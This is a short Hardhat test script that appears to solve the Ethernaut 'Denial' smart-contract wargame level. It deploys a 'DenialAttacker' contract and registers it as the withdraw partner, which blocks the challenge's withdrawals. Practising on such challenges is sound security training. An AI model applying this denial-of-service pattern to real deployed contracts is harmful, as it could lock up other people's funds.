import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Denial`);
  const challengeAddress = await createChallenge(
    `0xcE1BB92eeb71AF5Fec09D38B0c854d55285f6e04`,
    ethers.utils.parseEther(`1`)
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  const attackerFactory = await ethers.getContractFactory('DenialAttacker')
  let attacker = await attackerFactory.connect(eoa).deploy(challenge.address)

  await challenge.connect(eoa).setWithdrawPartner(attacker.address)
  
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
